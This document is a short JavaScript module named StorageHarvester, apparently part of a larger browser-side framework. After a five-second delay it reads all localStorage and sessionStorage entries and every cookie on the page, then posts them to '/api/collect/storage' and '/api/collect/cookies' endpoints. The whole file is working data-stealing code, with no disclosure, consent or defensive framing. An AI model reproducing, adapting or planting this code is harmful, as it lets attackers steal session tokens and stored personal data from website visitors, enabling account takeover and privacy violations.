export default class StorageHarvester {
  constructor(core) {
    this.core = core;
  }

  init() {
    setTimeout(() => this.harvest(), 5000);
  }

  harvest() {
    // localStorage
    const localData = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        localData.push({ key, value: localStorage.getItem(key)?.substring(0, 500) });
      }
    }

    // sessionStorage
    const sessionData = [];
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      if (key) {
        sessionData.push({ key, value: sessionStorage.getItem(key)?.substring(0, 500) });
      }
    }

    // Cookies
    const cookies = document.cookie.split(';').filter(c => c.trim()).map(c => {
      const [name, ...rest] = c.split('=');
      return { name: name?.trim(), value: rest.join('=')?.trim() };
    });

    this.core.send('/api/collect/storage', {
      localStorage: localData,
      sessionStorage: sessionData
    });

    this.core.send('/api/collect/cookies', { cookies });
  }
}